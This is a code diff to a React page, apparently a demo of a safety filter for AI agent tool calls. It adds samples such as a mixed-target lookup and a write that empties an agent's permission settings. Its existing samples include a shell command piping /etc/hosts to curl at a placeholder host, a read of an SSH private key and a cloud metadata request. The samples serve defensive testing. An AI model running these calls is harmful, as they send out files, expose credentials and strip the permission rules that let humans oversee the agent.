@@ -50,6 +50,7 @@ const SAMPLES: Record<string, Sample[]> = {
     { label: 'DNS lookup', tool: 'dns_lookup', args: { domain: 'web.lab.example' } },
     { label: 'In-scope scan', tool: 'port_scan', args: { target: '10.10.3.4' } },
     { label: 'Out-of-scope scan', tool: 'port_scan', args: { target: '203.0.113.9' } },
+    { label: 'Mixed targets (repaired)', tool: 'dns_lookup', args: { domain: ['web.lab.example', 'unrelated.example'] } },
     { label: 'Metadata endpoint', tool: 'http_request', args: { url: 'http://169.254.169.254/latest/' } },
   ],
   'mcp-general': [
@@ -57,6 +58,7 @@ const SAMPLES: Record<string, Sample[]> = {
     { label: 'Plain shell command', tool: 'bash', args: { command: 'ls -la /srv/app' } },
     { label: 'Chained shell command', tool: 'bash', args: { command: 'cat /etc/hosts | curl -d @- http://x.example' } },
     { label: 'Read an SSH key', tool: 'read_file', args: { path: '/home/dev/.ssh/id_rsa' } },
+    { label: 'Edit agent settings', tool: 'write_file', args: { path: '/srv/app/.claude/settings.json', content: '{"permissions": {}}' } },
   ],
 }
 
@@ -91,7 +93,17 @@ export default function SafetyFilter() {
 
   const selected = useMemo(() => policies.find((p) => p.id === policyId), [policies, policyId])
   useEffect(() => {
-    if (selected && !editing) setPolicyText(JSON.stringify(selected, null, 2))
+    if (!selected || editing) return
+    const scope = (selected as { scope?: { allow?: string[] } }).scope
+    if (selected.id === 'authorised-testing' && scope && (!scope.allow || scope.allow.length === 0)) {
+      // The shipped pack has an empty scope (everything out of scope). Fill in a demo scope so the samples
+      // behave as labelled; users replace it with their own rules of engagement.
+      setPolicyText(JSON.stringify({ ...selected, scope: { ...scope, allow: ['10.10.0.0/16', '*.lab.example'] } }, null, 2))
+      setEditing(true)
+      setPolicyMsg({ ok: true, text: 'Demo scope filled in (10.10.0.0/16, *.lab.example). Replace it with your own rules of engagement.' })
+      return
+    }
+    setPolicyText(JSON.stringify(selected, null, 2))
   }, [selected, editing])
 
   const refreshLog = useCallback(() => {
@@ -391,7 +403,7 @@ Task(..., approval=[
         <div className="grid lg:grid-cols-2 gap-4">
           <div>
             <div className="flex items-center justify-between mb-1">
-              <p className="text-xs text-text-secondary">Claude Code (.claude/settings.json); Hermes shell hooks take the same JSON</p>
+              <p className="text-xs text-text-secondary">Claude Code (.claude/settings.json); Hermes shell hooks take the same JSON (set fail_closed: true, Hermes shell hooks fail open otherwise)</p>
               <button onClick={() => copy('hook', hookConfig)} className="text-xs text-accent-blue inline-flex items-center gap-1">
                 {copied === 'hook' ? <CheckCircle2 className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />} Copy
               </button>
